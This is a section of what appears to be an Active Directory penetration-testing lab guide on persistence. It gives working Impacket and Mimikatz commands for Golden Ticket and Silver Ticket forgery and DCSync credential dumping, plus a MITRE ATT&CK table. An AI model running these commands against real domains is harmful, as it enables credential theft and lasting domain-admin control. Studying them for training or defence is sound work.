# 🔒 Phase 6: Persistence

Maintain long-term access to the AD environment even after password resets.

---

## 6.1 Golden Ticket Attack

Forge a TGT using the **krbtgt hash** — grants lifetime domain admin access.

```bash
# Step 1: Dump krbtgt hash (requires DA)
python3 secretsdump.py corp.local/adm-user:Admin@2024!@192.168.56.10

# Step 2: Create Golden Ticket with Impacket
python3 ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain corp.local Administrator

# Step 3: Use the ticket
export KRB5CCNAME=Administrator.ccache
python3 psexec.py corp.local/Administrator@dc01.corp.local -k -no-pass

# With Mimikatz (from Windows)
kerberos::golden /user:Administrator /domain:corp.local /sid:<DOMAIN_SID> /krbtgt:<HASH> /id:500
kerberos::ptt ticket.kirbi
```

---

## 6.2 Silver Ticket

Forge a TGS for a specific service without touching the DC.

```bash
# Forge silver ticket for CIFS service
python3 ticketer.py -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain corp.local -spn cifs/dc01.corp.local Administrator
```

---

## 6.3 DCSync Attack

```bash
# Dump all hashes from DC (requires Replicating Directory Changes rights)
python3 secretsdump.py -just-dc corp.local/adm-user:Admin@2024!@192.168.56.10

# With Mimikatz
lsadump::dcsync /domain:corp.local /user:Administrator
lsadump::dcsync /domain:corp.local /all /csv
```

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Steal or Forge Kerberos Tickets: Golden | T1558.001 | krbtgt-based forgery |
| Steal or Forge Kerberos Tickets: Silver | T1558.002 | Service ticket forgery |
| OS Credential Dumping: DCSync | T1003.006 | Replication-based dump |
